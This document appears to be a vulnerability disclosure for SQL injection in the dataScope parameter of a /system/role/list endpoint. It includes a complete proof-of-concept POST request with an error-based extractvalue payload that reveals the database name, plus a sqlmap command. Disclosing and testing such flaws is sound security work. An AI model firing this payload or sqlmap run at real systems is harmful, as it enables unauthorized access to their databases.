SQL injection exists in the dataScope parameter of the /system/role/list interface of the system.  
The cause of this vulnerability is the use of the $ placeholder symbol.  
![image](https://github.com/biantaibao/snow_SQL/assets/131763503/f03ed2f3-cfb3-43c0-aac3-43b476d201da)  
Find the front-end interface of the interface and click search in the role management.  
<img width="415" alt="image" src="https://github.com/biantaibao/snow_SQL/assets/131763503/874707cd-41a3-45e7-8f33-f30444ec5ddf">   
poc:  
POST /system/role/list HTTP/1.1  
Host: 127.0.0.1:9527  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
X-Requested-With: XMLHttpRequest  
Content-Length: 150  
Origin: http://127.0.0.1:9527  
Connection: close  
Referer: http://127.0.0.1:9527/system/role  
Cookie: Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1704968094;  
Sec-Fetch-Dest: empty  
Sec-Fetch-Mode: cors  
Sec-Fetch-Site: same-origin  

roleName=11&roleKey=11&status=&params%5BbeginTime%5D=&params%5BendTime%5D=&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))  

Successfully viewed database。  
![image](https://github.com/biantaibao/snow_SQL/assets/131763503/f3ecfa83-796b-43c3-abd3-4dbfdef48aba)  
![image](https://github.com/biantaibao/snow_SQL/assets/131763503/b186c4dc-cc72-45d1-9223-7bb7e38dace1)  
sqlmap command：python sqlmap.py -r sql.txt  
![image](https://github.com/biantaibao/snow_SQL/assets/131763503/384af2e6-084b-4218-a8ef-103382374912)






